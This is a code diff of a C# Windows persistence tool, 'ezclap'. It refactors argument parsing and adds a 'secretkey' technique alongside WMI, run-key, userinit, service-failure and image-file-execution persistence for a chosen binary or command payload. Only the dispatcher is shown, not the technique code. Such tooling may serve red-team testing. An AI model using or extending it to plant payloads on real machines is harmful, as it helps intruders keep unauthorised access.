@@ -127,18 +127,20 @@ namespace ezclap
         static void Main(string[] args)
         {
 
+            /* ----- Initializing variables  ----- */
             Random rnd = new Random();
             string originalPayloadLoc = "";
             var binaryPayload = new List<string>();
             var commandPayload = new List<string>();
             var techniques = new List<string>();
-            bool binary = false;
+            bool binaryBool = false;
             bool all = false;
+            var payloadArr = new string[0];
 
-            // Parse Arguments from the Commandline 
+            /* ----- Argument Parsing Begins  ----- */
             Parser.Default.ParseArguments<Options>(args).WithParsed<Options>(o =>
             {
-                // Parse Payloads. It can be either Binary or Command
+                /* ----- Arg Parse for payloads. Either binary or command   ----- */
                 if (o.Binary != null)
                 {
                     Console.WriteLine("[+] Binary payload selected: " + o.Binary);
@@ -148,24 +150,28 @@ namespace ezclap
                     else
                     { Console.WriteLine("[-] File does not exist."); System.Environment.Exit(1); }
 
+                    binaryBool = true;
                     originalPayloadLoc = o.Binary;
-                    binary = true;
                     binaryPayload = Utils.parseConfig("payload", "name");
                 }
+                // Command is selected
                 else if (o.Command != null)
                 {
+                    binaryBool = false;
                     Console.WriteLine("[+] Command payload selected: " + o.Command);
                     commandPayload.Add(o.Command);
                 }
+                // No payloads selected. Exit.
                 else
                 {
                     Console.WriteLine("[-] Payload not selected. Use (-b) or (-c) or payloads. Exiting.");
                     System.Environment.Exit(1);
                 }
 
-                // Parse Persist techniques 
+                /* ----- Arg Parse for techniques   ----- */
                 if (o.Techniques != null)
                 {
+               
                     // If all, add all techniques 
                     if (o.Techniques == "all")
                     {
@@ -177,6 +183,7 @@ namespace ezclap
                         techniques.Add("userinit");
                         techniques.Add("failure");
                         techniques.Add("runkey");
+                        techniques.Add("secretkey");
                         techniques.Add("imagefile");
                     }
                     
@@ -189,31 +196,41 @@ namespace ezclap
 
                     }
                 }
+                else
+                {
+                    Console.WriteLine("[-] Techniques not selected. Exiting.");
+                    System.Environment.Exit(1);
+                }
+
+
+                var binaryPayloadArr = binaryPayload.ToArray();
+                var commandPayloadArr = commandPayload.ToArray();
+
+                // Setup before the persist techniques 
+                // If binary payload selected, make payloadArr to be binary payload 
+                if (o.Binary != null)
+                {
+                    setup(binaryBool, originalPayloadLoc, binaryPayloadArr);
+                    payloadArr = binaryPayloadArr;
+                }
+                // Else, make payloadArr to be command payload 
+                else
+                {
+                    setup(binaryBool, "", new string[0]);
+                    payloadArr = commandPayloadArr;
+                
+                }
 
             });
 
-            var binaryPayloadArr = binaryPayload.ToArray();
-            var commandPayloadArr = commandPayload.ToArray();
-            var payloadArr = new string[0];
 
-            // Setup before the persist techniques 
-            if (binary == true)
-            {
-                Console.WriteLine("[+] Binary payload selected");
-                setup(binary, originalPayloadLoc, binaryPayloadArr);
-                payloadArr = binaryPayloadArr;
-            }
-            else
-            {
-                payloadArr = commandPayloadArr;
-                setup(binary, "", new string[0]);
-            }
+            /* -----   Start of implementing persistence techniques   ----- */
 
 
             // Actually Execute Persistence techniques 
             foreach (var technique in techniques)
             {
-                if(technique == "wmi")
+                if (technique == "wmi")
                 {
                     var WMIName = Utils.parseConfig("techniques/AddWMI", "name").ToArray();
                     Array.ForEach(WMIName, element => Console.WriteLine(element));
@@ -269,11 +286,19 @@ namespace ezclap
                     modifyImageFileExec(payloadArr);
                 }
 
-                //System.IO.File.Delete(originalPayloadLoc);
+                if(technique == "secretkey" && binaryBool == true)
+                {
+                    AddSecretKey persistSecretKey = new AddSecretKey(payloadArr[0]);
+                }
 
-                Console.WriteLine("[+] All persistence mechanisms are done.");
+                //System.IO.File.Delete(originalPayloadLoc);
             }
-            
+
+
+
+            Console.WriteLine("[+] All persistence mechanisms are done.");
+            System.Environment.Exit(1);
+
         }
     }
 }
